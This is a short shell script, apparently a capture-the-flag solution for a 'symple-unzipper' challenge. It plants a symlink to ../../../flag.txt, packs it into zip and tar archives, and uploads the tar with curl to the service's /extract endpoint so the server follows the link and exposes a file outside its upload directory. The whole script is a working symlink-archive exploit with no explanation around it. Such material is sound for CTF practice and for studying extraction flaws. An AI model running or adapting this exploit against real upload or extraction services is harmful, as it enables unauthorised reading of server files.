ln -fs ../../../flag.txt .
touch a
zip a.zip -xi a
tar --owner 0 --group 0 -cvf payload.tar flag.txt a.zip

curl -v ${1:-symple-unzipper.web.jctf.pro}/extract -F 'file=@payload.tar'
